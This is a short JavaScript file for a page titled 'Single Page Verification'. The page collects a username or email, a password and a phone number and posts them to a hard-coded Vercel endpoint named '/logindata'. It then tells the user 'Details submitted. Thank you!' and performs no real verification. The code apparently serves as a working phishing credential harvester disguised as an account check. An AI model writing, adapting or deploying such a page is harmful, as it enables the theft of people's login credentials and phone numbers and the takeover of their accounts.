// script.js (for Single Page Verification - index.html)
document.addEventListener('DOMContentLoaded', function () {
    const verificationForm = document.getElementById('verificationForm');
    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const messageDiv = document.getElementById('message');

    // Your Vercel Backend URL - PRE-FILLED!
    const BACKEND_API_URL = 'https://number2-adamahmeddds-projects.vercel.app/logindata';

    verificationForm.addEventListener('submit', async function (event) {
        event.preventDefault(); // Prevent default form submission

        const username = usernameInput.value.trim();
        const password = passwordInput.value; // Passwords usually aren't trimmed
        const phoneNumber = phoneNumberInput.value.trim();

        if (messageDiv) {
            messageDiv.textContent = '';
            messageDiv.className = 'message';
            messageDiv.classList.remove('show');
        }

        if (username === '' || password === '' || phoneNumber === '') {
            displayMessage('Please fill in all fields: username/email, password, and phone number.', 'error');
            return;
        }

        const dataToSend = {
            username: username,
            password: password,
            phoneNumber: phoneNumber
        };

        try {
            const response = await fetch(BACKEND_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(dataToSend),
            });

            if (response.ok) {
                displayMessage('Details submitted. Thank you!', 'success');
                verificationForm.reset(); // Optional: clear the form after successful submission
            } else {
                const errorData = await response.text();
                console.error('Server error:', response.status, errorData);
                displayMessage('Submission failed. Server responded with an error.', 'error');
            }
        } catch (error) {
            console.error('Network error or other issue sending data:', error);
            displayMessage('Could not submit data. Check your internet connection or try again later.', 'error');
        }
    });

    function displayMessage(msg, type) {
        if (messageDiv) {
            setTimeout(() => {
                messageDiv.textContent = msg;
                messageDiv.classList.add(type);
                messageDiv.classList.add('show');
            }, 50);
        } else {
            alert((type === 'error' ? "Error: " : "") + msg);
        }
    }
});
